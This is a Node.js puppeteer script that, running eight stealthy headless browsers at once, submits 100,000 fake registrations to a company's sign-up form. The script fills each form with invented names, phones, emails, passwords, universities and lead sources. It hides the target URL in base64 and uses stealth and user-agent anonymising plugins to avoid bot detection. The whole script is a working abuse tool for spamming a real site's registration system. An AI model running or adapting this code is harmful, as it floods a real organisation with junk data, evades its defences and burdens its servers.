const faker = require('faker');
const {
    Cluster
} = require('puppeteer-cluster')
const vanillaPuppeteer = require('puppeteer')
const txtgen = require('txtgen');
const {
    addExtra
} = require('puppeteer-extra')
const Stealth = require('puppeteer-extra-plugin-stealth')
const Recaptcha = require('puppeteer-extra-plugin-recaptcha');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker')
const {
    fake
} = require('faker');
const userAgent = require('user-agents');
const publicIp = require('public-ip');
var randomName = require("chinese-random-name");

async function main() {
    // Create a custom puppeteer-extra instance using `addExtra`,
    // so we could create additional ones with different plugin config.
    const puppeteer = addExtra(vanillaPuppeteer)
    puppeteer.use(Stealth())
    puppeteer.use(AdblockerPlugin({
        blockTrackers: true
    }))
    puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')())
    puppeteer.use(require('puppeteer-extra-plugin-block-resources')({
        blockedTypes: new Set(['image', 'stylesheet', 'media'])
    }))

    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 8,
        timeout: 1000000,
        puppeteerOptions: {
            headless: true
        }
    });
    // Event handler to be called in case of problems
    cluster.on('taskerror', (err, data) => {
        console.log(`Exception in ${data}: ${err.message}`);
    });

    await cluster.task(async ({
        page,
        data: url
    }) => {
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (req.resourceType() === 'image') {
                req.abort();
            } else {
                req.continue();
            }
        });

        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 0
        });
        await page.waitForSelector("#first_name")
        await page.click("#first_name")

        String.prototype.capitalize = function () {
            return this.charAt(0).toUpperCase() + this.slice(1);
        }
        SURN = ["wang", "li", "zhang", "liu", "chen", "yang", "huang", "zhao", "wu", "zhou",
            "xu", "xv", "sun", "ma", "zhu", "hu", "guo", "he", "lin", "gao", "luo",
            "zheng", "liang", "xie", "song", "tang", "deng", "han", "feng", "cao",
            "peng", "zeng", "xiao", "tian", "dong", "pan", "yuan", "cai", "jiang", "yu",
            "du", "ye", "cheng", "wei", "su", "lv", "ding", "ren", "lu",
            "yao", "shen", "zhong", "cui", "tan", "fan", "liao",
            "shi", "jin", "jia", "xia", "fu", "fang", "zou", "xiong", "bai",
            "meng", "qin", "qiu", "hou", "yin", "xue", "yan", "duan", "lei",
            "long", "tao", "mao", "hao", "gu", "gong", "shao",
            "wan", "qian", "dai", "ou", "mo", "kong", "xiang", "chang"
        ]
        let randomIndex = Math.floor(Math.random() * SURN.length);
        let firstName = SURN[randomIndex].capitalize()
        let lastName = faker.name.lastName()
        await page.type("#first_name", firstName)
        await page.type("#last_name", lastName)
        await page.type("#phone", faker.phone.phoneNumber('0##########'))
        let email = faker.internet.email(firstName, lastName);
        await page.type("#email", email);

        let password = faker.internet.password()
        await page.type("#password", password)

        university = [
            "Aberdeen", "Abertay Dundee", "Aberystwyth", "Anglia Ruskin", "Arts University Bournemouth", "Aston", "Bangor", "Baruch", "Bath", "Bath Spa", "Bedfordshire", "Belfast", "Binghamton", "Birkbeck College", "Birmingham", "Birmingham City", "Bishop Grosseteste", "Bolton", "Boston University", "Bournemouth", "Bradford", "Brighton", "Bristol", "Brunel", "Buckingham", "Buckinghamshire New", "Cal State Fullerton", "Cal State Long Beach", "Cambridge", "Canterbury Christ Church", "Cardiff", "Cardiff Metro", "Central Lancashire", "Chester", "Chichester", "City", "City of London University CASS", "Conservatoire for Dance and Drama", "Courtauld Institute of Art", "Coventry", "Cranfield", "CSUN (Northridge)", "Cumbria", "De Montfort", "Derby", "Drexel", "Dundee", "Durham", "East Anglia", "East London", "Edge Hill", "Edinburgh", "Edinburgh Napier", "Essex", "Exeter", "Fairley Dickenson", "Falmouth", "Fordham", "Glasgow", "Glasgow Caledonian", "Glasgow School of Art", "Gloucestershire", "Glyndwr", "Goldsmiths College", "Greenwich", "Guildhall School of Music and Drama", "Harper Adams", "Hatfield", "Heriot-Watt", "Hertfordshire", "Heythrop", "Hofstra", "Huddersfield", "Hull", "Imperial College London", "Institute of Cancer Research", "Institute of Education", "John Hopkins University", "Keele", "Kent", "King's College London", "Kingston", "Lancaster", "Leeds", "Leeds Beckett", "Leeds College of Art", "Leeds Trinity", "Leicester", "Lincoln", "Liverpool", "Liverpool Hope", "Liverpool John Moores", "London Business School", "London Metropolitan University", "London School of Economics", "London School of Hygiene and Tropical Medicine", "London South Bank", "Loughborough", "Manchester"
        ]
        // get random index value
        randomIndex = Math.floor(Math.random() * university.length);
        await page.select("#\\30 0N2400000BpoJI", university[randomIndex])

        lead_source = [
            "WeChat Group", "Zhihu", "Ref Friend", "Campus Visit", "Career Fair", "Facebook", "Google / Other Search", "MC Webinar", "Ref Candidate", "Seminar", "Sina Weibo", "Virtual Career Fair", "Web Registration", "Word of mouth", "Campus Ambassador (Consultant)", "Campus Ambassador (Management)", "Summer Lead Generation", "BA", "MOS managed BA", "MOS", "Other (please indicate)"
        ]
        randomIndex = Math.floor(Math.random() * lead_source.length);
        await page.select("#lead_source", lead_source[randomIndex])
        // await page.click("#__privacy")
        await page.waitForTimeout(1000)

        await page.click('.form [name="submit"]')
        console.log(`Registration Complete: ${firstName} ${lastName} - ${email} - ${password}`)


        await page.waitForTimeout(10000);
    });

    for (let i = 0; i < 100000; i++) {
        cluster.queue(Buffer.from("aHR0cHM6Ly93d3cubWNpd29ybGR3aWRlLmNvbS8=", 'base64').toString('binary'))
    }

    console.log(`Current Public IP: ${await publicIp.v4()}`)

    await cluster.idle();
    await cluster.close();
}

main().catch(console.warn)

async function autoScroll(page) {
    await page.evaluate(async () => {
        await new Promise((resolve, reject) => {
            var totalHeight = 0;
            var distance = 100;
            var timer = setInterval(() => {
                var scrollHeight = document.body.scrollHeight;
                window.scrollBy(0, distance);
                totalHeight += distance;

                if (totalHeight >= scrollHeight) {
                    clearInterval(timer);
                    resolve();
                }
            }, 100);
        });
    });
}